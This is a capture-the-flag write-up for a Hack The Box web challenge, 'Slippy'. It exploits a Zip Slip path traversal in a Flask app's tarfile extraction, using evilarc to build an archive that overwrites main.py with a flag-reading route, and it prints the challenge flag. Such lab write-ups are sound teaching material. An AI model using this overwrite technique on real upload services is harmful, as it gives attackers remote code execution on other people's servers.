# Slippy

## tl;dr
- Realize that the package used to extract archives is vulnerable to Zip Slip
- Find where extracted files go to
- Modify main.py to add a route which, when visited, returns the flag
- Use evilarc to craft the malicious archive
- Upload the archive and navigate to the new route to get the flag

## Description
You've found a portal for a firmware upgrade service, responsible for the deployment and maintenance of rogue androids hunting humans outside the tractor city. The question is... what are you going to do about it?

## Attack Narrative

### Getting Started

Once we navigate to the given URL we are greeted with this page:

![slippy_home_page](https://i.imgur.com/oOPAqk6.png)

So... A challenge called *'Slippy'* and a site that let's you upload *.tar.gz* files? Can't be a coincidence...
Now, you might be confused but I am referring to the [*Zip Slip*](https://github.com/snyk/zip-slip-vulnerability) Vulnerability which basically let's you (over)write files when extracting an archive whose filenames are basically directory traverals. However, not all extraction applications are vulnerable. Let's check what the given app uses.

In the *util.py* file we can see that the web application is using the *tarfile* package to perform such extractions which is, as you've guessed it, vulnerable to zip slip:

![table_heading](https://i.imgur.com/JHsM4MR.png)
![tarfile_entry](https://i.imgur.com/lFsfVzV.png)

### Flag Hunting

Now that we know that *tarfile* is vulnerable we just need to exploit it!

From the Web App source code we are given we also know that the *flag* file is in the same directory as the *run.py* file:

![flag_location](https://i.imgur.com/EiHnMCJ.png)

Now, we can't directly access that since whatever is extracted from our uploaded archive will overwrite any previous files with the same file name. What we can do, is play around a bit with the *main.py* file which contains the *app* loaded - in debug mode - from within *run.py*.

*run.py* (the one we are given at least, port differs on the remote machine):
```Python
from application.main import app

app.run(host='0.0.0.0', port=1337, debug=True, use_evalex=False)
```
*Note: 'degub' is set to 'True' which means that each time Flask detects a code change it will auto-reload the app - great, isn't it?*

What we can easily do knowing this, is add a new route to the *main.py* file which would just read the *flag* file and return its contents:
```Python
@app.route('/exec')
def print_flag():
    flag = open("flag", "r")
    return flag.read()
```

For this route to be added, we actually have to upload the new *main.py* file to the web app. Before we do that, we need to find out where the extracted files are stored so that we know how many directories we'll have to traverse. From *util.py* we get that:
```Python
extractdir = f'{main.app.config["UPLOAD_FOLDER"]}/{generate(15)}'
```
Also from *config.py* we get that:
```Python
UPLOAD_FOLDER = '/app/application/static/archives'
```
so our archive should contain a file with the filename:
```
../../../main.py
```
Now, we can't create such an archive directly from the command line but, thankfully, there's a tool called [evilarc](https://github.com/ptoomey3/evilarc) that can do this for us.

We just clone the repo using:
```
git clone git@github.com:ptoomey3/evilarc.git
```

and then create our desired archive using:
```
python2 evilarc.py ../web_slippy/challenge/application/main.py -f slippy.tar.gz -d 3 -o unix
```

Theoritically, all that's left to do now is upload our new *main.py* file and navigate to */exec*.

Uploading the file seems successful:

![uploaded_tar](https://i.imgur.com/vWOz09f.png)

So, let's try navigating to */exec*:

![exec](https://i.imgur.com/nU2667I.png)

Voila! 

P.S.: No, I didn't expect everything to go as smoothly as it did from the first try but I'm not complaining!


## Flag
The flag in text is:
```
HTB{i_slipped_my_way_to_rce}
```
